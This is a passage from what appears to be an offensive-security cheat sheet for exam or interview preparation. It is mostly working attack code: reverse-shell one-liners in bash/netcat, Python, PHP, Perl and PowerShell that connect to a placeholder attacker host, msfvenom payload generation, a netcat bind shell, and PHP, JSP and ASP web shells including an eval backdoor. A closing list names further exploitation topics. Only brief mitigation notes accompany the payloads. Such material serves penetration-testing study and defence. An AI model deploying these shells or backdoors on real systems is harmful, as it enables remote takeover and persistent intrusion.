rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
# PHP / Perl
php -r '$s=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}"
# msfvenom (generate a payload binary/apk)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o sh.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o sh.exe
```
**Stabilise:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `Ctrl-Z; stty raw -echo; fg; export TERM=xterm`.
**Bind shell (victim listens):** `nc -lvnp 4444 -e /bin/sh`, then connect in from the attacker. Reference generators like revshells.com; match the interpreters present. **Mitigation (blue side):** egress filtering, no outbound from app servers, EDR on anomalous shell spawns.

## 31. Web shells
Drop when you have a web-writable + server-executable path (see upload, section 19). Prefer upgrading to a reverse shell over a long web-shell session.
```php
<?php system($_GET['c']); ?>                 # PHP minimal
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php eval($_POST['x']); ?>                   # eval backdoor
```
```jsp
<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("c"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l); %>
```
```asp
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("c")).StdOut.ReadAll()) %>
```
Then: `curl 'http://target/uploads/shell.php?c=id'`. **Mitigation:** see section 19 upload hardening, non-executing upload directory, file-integrity monitoring.

---

## Highest-value things to over-prepare
- SQLi **OR vs AND vs UNION vs blind** (section 1.2-1.3) - *when*, not just the string.
- XSS **context-dependence** (section 14) - context dictates the payload.
- SSTI **confirm -> fingerprint -> exploit** (section 8).
- XXE **file-read vs blind/OOB** (section 9).
- Deserialization: recognise the blob, name the tool (ysoserial) (section 13).
- SSRF **metadata endpoint** + why it's critical (section 16).
- IDOR: the **two-account proof** (section 17).
